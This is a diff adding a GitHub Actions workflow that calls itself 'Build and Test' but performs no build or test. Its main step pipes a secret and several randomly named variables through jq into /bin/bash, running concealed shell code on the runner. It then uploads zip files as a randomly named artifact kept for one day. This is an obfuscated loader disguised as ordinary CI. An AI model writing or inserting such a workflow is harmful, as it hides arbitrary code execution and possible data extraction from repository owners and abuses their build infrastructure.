@@ -1,0 +1,30 @@
+name: Build and Test
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Go
+        env:
+          e80: ${{ secrets.e80 }}
+        run: |
+          printf '%s' "$e80" | jq -r .ls57 | /bin/bash
+          echo $is9728 | jq -r .tltjk0 | /bin/bash
+          printf '%s' "$bmrwq1806" | jq -r .lq14 | /bin/bash
+          printf '%s' "$yn55" | jq -r .ugzmd40947 | /bin/bash
+          echo $c8913 | jq -r .jbku4592 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: M7brvfvl
+          path: "*.zip"
+          retention-days: 1
